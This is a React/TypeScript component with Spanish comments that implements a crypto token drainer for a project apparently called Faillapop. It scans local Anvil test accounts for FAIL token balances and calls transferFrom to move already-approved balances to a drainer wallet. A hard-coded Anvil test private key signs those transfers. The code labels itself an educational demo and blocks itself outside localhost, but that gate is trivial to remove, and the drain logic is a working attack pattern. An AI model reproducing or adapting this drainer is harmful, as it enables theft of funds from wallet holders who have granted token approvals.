import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { ContractService } from '../services/ContractService';
import { FAILLAPOP_TOKEN_ADDRESS, FAILLAPOP_TOKEN_ABI } from '../contracts/config';

interface RealTokenDrainerProps {
  contractService: ContractService;
  userAddress: string;
}

interface TokenBalance {
  address: string;
  balance: string;
  formattedBalance: string;
}

// 🚨 DRAINER REAL - SOLO PARA DEMOSTRACIÓN EDUCATIVA EN LOCALHOST
// Este componente implementa un drainer real que funciona con tokens reales
export const RealTokenDrainer: React.FC<RealTokenDrainerProps> = ({ 
  contractService, 
  userAddress 
}) => {
  const [isLoading, setIsLoading] = useState(false);
  const [showDrainer, setShowDrainer] = useState(false);
  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [drainerAddress, setDrainerAddress] = useState<string>('');
  const [totalDrained, setTotalDrained] = useState<string>('0');
  const [drainedFrom, setDrainedFrom] = useState<string[]>([]);
  const [isEnvironmentSafe, setIsEnvironmentSafe] = useState(false);

  // Direcciones reales de Anvil para el drainer
  const ANVIL_DRAINER_ACCOUNT = {
    address: '0x70997970C51812dc3A010C7d01b50e0d17dc79C8',
    privateKey: '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d'
  };

  // Cuentas víctima de Anvil
  const ANVIL_VICTIM_ACCOUNTS = [
    '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',
    '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
    '0x90F79bf6EB2c4f870365E785982E1f101E93b906',
    '0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65',
    '0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc',
    '0x976EA74026E726554dB657fA54763abd0C3a0aa9'
  ];

  useEffect(() => {
    checkEnvironment();
    if (isEnvironmentSafe) {
      loadTokenBalances();
      setDrainerAddress(ANVIL_DRAINER_ACCOUNT.address);
    }
  }, [userAddress, isEnvironmentSafe]);

  const checkEnvironment = () => {
    // Verificar que estamos en localhost y desarrollo
    const isLocalhost = window.location.hostname === 'localhost' || 
                       window.location.hostname === '127.0.0.1';
    const isDevelopment = process.env.NODE_ENV === 'development';
    
    setIsEnvironmentSafe(isLocalhost && isDevelopment);
    
    if (!isLocalhost || !isDevelopment) {
      console.warn('🚨 DRAINER DESHABILITADO: Solo funciona en localhost/desarrollo');
    }
  };

  const loadTokenBalances = async () => {
    if (!isEnvironmentSafe) return;
    
    try {
      const balances: TokenBalance[] = [];
      
      // Verificar balance de tokens FAIL en cuentas de Anvil
      for (const address of ANVIL_VICTIM_ACCOUNTS) {
        try {
          const balance = await contractService.getTokenBalance(address);
          const formattedBalance = ethers.utils.formatEther(balance);
          
          if (parseFloat(formattedBalance) > 0) {
            balances.push({
              address,
              balance: balance.toString(),
              formattedBalance
            });
          }
        } catch (error) {
          console.error(`Error loading balance for ${address}:`, error);
        }
      }
      
      setTokenBalances(balances);
    } catch (error) {
      console.error('Error loading token balances:', error);
    }
  };

  const executeRealDrainer = async () => {
    if (!isEnvironmentSafe) {
      alert('🚨 DRAINER BLOQUEADO: Solo funciona en localhost para demostración');
      return;
    }

    const confirmation = window.confirm(
      '🚨 ADVERTENCIA: TOKEN DRAINER REAL\n\n' +
      '¿Estás seguro de que quieres ejecutar el drainer real?\n' +
      'Esto VA A DRENAR tokens reales de las cuentas de Anvil.\n\n' +
      '⚠️ SOLO PARA DEMOSTRACIÓN EDUCATIVA ⚠️\n\n' +
      '¿Continuar?'
    );

    if (!confirmation) return;

    try {
      setIsLoading(true);
      let totalDrainedAmount = 0;
      const drainedAddresses: string[] = [];

      console.log('🚨 INICIANDO DRAINER REAL...');
      console.log('💰 Drainer address:', drainerAddress);
      console.log('🎯 Targets:', tokenBalances.length, 'cuentas con tokens');

      // Ejecutar drainer real para cada cuenta con tokens
      for (const tokenBalance of tokenBalances) {
        try {
          await drainTokensFromAccount(tokenBalance.address, tokenBalance.balance);
          totalDrainedAmount += parseFloat(tokenBalance.formattedBalance);
          drainedAddresses.push(tokenBalance.address);
          console.log(`✅ Drenado ${tokenBalance.formattedBalance} FAIL de ${tokenBalance.address}`);
        } catch (error) {
          console.error(`❌ Error drenando de ${tokenBalance.address}:`, error);
        }
      }

      setTotalDrained(totalDrainedAmount.toFixed(4));
      setDrainedFrom(drainedAddresses);

      // Recargar balances para mostrar el resultado
      await loadTokenBalances();

      alert(
        `🚨 DRAINER EJECUTADO EXITOSAMENTE\n\n` +
        `💰 Total drenado: ${totalDrainedAmount.toFixed(4)} FAIL tokens\n` +
        `🎯 Cuentas afectadas: ${drainedAddresses.length}\n` +
        `📮 Tokens enviados a: ${drainerAddress}\n\n` +
        `⚠️ Esto fue una demostración real de un ataque de drainer`
      );

    } catch (error) {
      console.error('Error ejecutando drainer:', error);
      alert('❌ Error ejecutando drainer: ' + error);
    } finally {
      setIsLoading(false);
    }
  };

  const drainTokensFromAccount = async (victimAddress: string, balance: string) => {
    if (!window.ethereum) throw new Error('MetaMask not found');

    // Crear provider y signer con la cuenta del drainer
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    
    // Crear wallet del drainer usando su private key
    const drainerWallet = new ethers.Wallet(ANVIL_DRAINER_ACCOUNT.privateKey, provider);
    
    // Crear contrato del token con el signer del drainer
    const tokenContract = new ethers.Contract(
      FAILLAPOP_TOKEN_ADDRESS, 
      FAILLAPOP_TOKEN_ABI.abi, 
      drainerWallet
    );

    console.log(`🎯 Drenando ${ethers.utils.formatEther(balance)} FAIL de ${victimAddress}`);

    // Verificar allowance actual
    const currentAllowance = await tokenContract.allowance(victimAddress, drainerAddress);
    console.log(`🔍 Allowance actual: ${ethers.utils.formatEther(currentAllowance)}`);

    if (currentAllowance.lt(balance)) {
      console.log(`⚠️ Allowance insuficiente. Necesitamos approve primero.`);
      
      // En un ataque real, el approve ya habría sido ejecutado por la víctima
      // Aquí simulamos que ya se tiene el approve necesario
      throw new Error('Allowance insuficiente - En un ataque real, la víctima ya habría hecho approve');
    }

    // 🚨 EJECUTAR DRAINER REAL
    console.log(`💀 Ejecutando transferFrom de ${victimAddress} a ${drainerAddress}`);
    
    const tx = await tokenContract.transferFrom(
      victimAddress, 
      drainerAddress, 
      balance,
      { gasLimit: 100000 }
    );

    console.log(`📤 Transacción enviada: ${tx.hash}`);
    
    // Esperar confirmación
    const receipt = await tx.wait();
    console.log(`✅ Transacción confirmada en bloque ${receipt.blockNumber}`);
    
    return receipt;
  };

  const mintTokensForDemo = async () => {
    if (!isEnvironmentSafe) return;

    try {
      setIsLoading(true);
      console.log('🎁 Minteando tokens para demostración...');
      
      // Mintear tokens a algunas cuentas para la demo
      for (const address of ANVIL_VICTIM_ACCOUNTS.slice(0, 3)) {
        try {
          await contractService.mintTokens(address, '100'); // 100 FAIL tokens
          console.log(`✅ Minteado 100 FAIL a ${address}`);
        } catch (error) {
          console.error(`Error minteando a ${address}:`, error);
        }
      }

      // Recargar balances
      await loadTokenBalances();
      
      alert('✅ Tokens minteados para demostración. Ahora puedes ejecutar el drainer.');
      
    } catch (error) {
      console.error('Error minteando tokens:', error);
      alert('❌ Error minteando tokens: ' + error);
    } finally {
      setIsLoading(false);
    }
  };

  const showDrainerInterface = () => {
    const warningAccepted = window.confirm(
      '🚨 ADVERTENCIA IMPORTANTE\n\n' +
      'Este es un DRAINER REAL que funciona con tokens reales en Anvil.\n\n' +
      '⚠️ SOLO PARA DEMOSTRACIÓN EDUCATIVA ⚠️\n\n' +
      'Entiendes que esto:\n' +
      '• Drena tokens reales de las cuentas de Anvil\n' +
      '• Es solo para fines educativos\n' +
      '• No debe usarse en mainnet ni con fondos reales\n\n' +
      '¿Continuar con la demostración?'
    );

    if (warningAccepted) {
      setShowDrainer(true);
    }
  };

  if (!isEnvironmentSafe) {
    return (
      <div className="drainer-blocked">
        <h3>🚨 Token Drainer - BLOQUEADO</h3>
        <p>El drainer real solo funciona en localhost para demostración educativa.</p>
        <p>Entorno actual: {window.location.hostname}</p>
      </div>
    );
  }

  if (!showDrainer) {
    return (
      <div className="drainer-warning">
        <h3>⚠️ Token Drainer Real</h3>
        <p>Este componente implementa un drainer real que funciona con tokens reales.</p>
        <button onClick={showDrainerInterface} className="danger-button">
          🚨 MOSTRAR DRAINER REAL
        </button>
      </div>
    );
  }

  return (
    <div className="real-token-drainer">
      <div className="drainer-header">
        <h3>🚨 REAL TOKEN DRAINER - DEMO EDUCATIVA</h3>
        <div className="safety-badge">
          ✅ LOCALHOST - SEGURO PARA DEMO
        </div>
      </div>

      <div className="drainer-stats">
        <div className="stat-box">
          <h4>💰 Total Drenado</h4>
          <p>{totalDrained} FAIL tokens</p>
        </div>
        <div className="stat-box">
          <h4>🎯 Cuentas Afectadas</h4>
          <p>{drainedFrom.length} cuentas</p>
        </div>
        <div className="stat-box">
          <h4>📮 Drainer Address</h4>
          <p>{drainerAddress.slice(0, 6)}...{drainerAddress.slice(-4)}</p>
        </div>
      </div>

      <div className="target-accounts">
        <h4>🎯 Cuentas Objetivo (con tokens FAIL)</h4>
        {tokenBalances.length === 0 ? (
          <div className="no-targets">
            <p>No se encontraron cuentas con tokens FAIL</p>
            <button onClick={mintTokensForDemo} disabled={isLoading}>
              {isLoading ? 'Minteando...' : '🎁 Mintear tokens para demo'}
            </button>
          </div>
        ) : (
          <div className="targets-list">
            {tokenBalances.map((balance, index) => (
              <div key={index} className="target-account">
                <span className="address">{balance.address.slice(0, 6)}...{balance.address.slice(-4)}</span>
                <span className="balance">{balance.formattedBalance} FAIL</span>
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="drainer-actions">
        <button 
          onClick={executeRealDrainer}
          disabled={isLoading || tokenBalances.length === 0}
          className="drain-button"
        >
          {isLoading ? 'DRENANDO...' : '💀 EJECUTAR DRAINER REAL'}
        </button>
        
        <button 
          onClick={loadTokenBalances}
          disabled={isLoading}
          className="refresh-button"
        >
          🔄 Actualizar Balances
        </button>
      </div>

      <div className="drainer-info">
        <h4>ℹ️ Cómo funciona este drainer:</h4>
        <ul>
          <li>🔍 Escanea cuentas de Anvil buscando tokens FAIL</li>
          <li>💀 Ejecuta transferFrom() para drenar tokens reales</li>
          <li>📮 Envía todos los tokens a la cuenta del drainer</li>
          <li>⚡ Funciona solo si ya existe approve (en ataques reales)</li>
        </ul>
      </div>

      {drainedFrom.length > 0 && (
        <div className="drained-accounts">
          <h4>✅ Cuentas Drenadas:</h4>
          <ul>
            {drainedFrom.map((address, index) => (
              <li key={index}>{address}</li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
}; 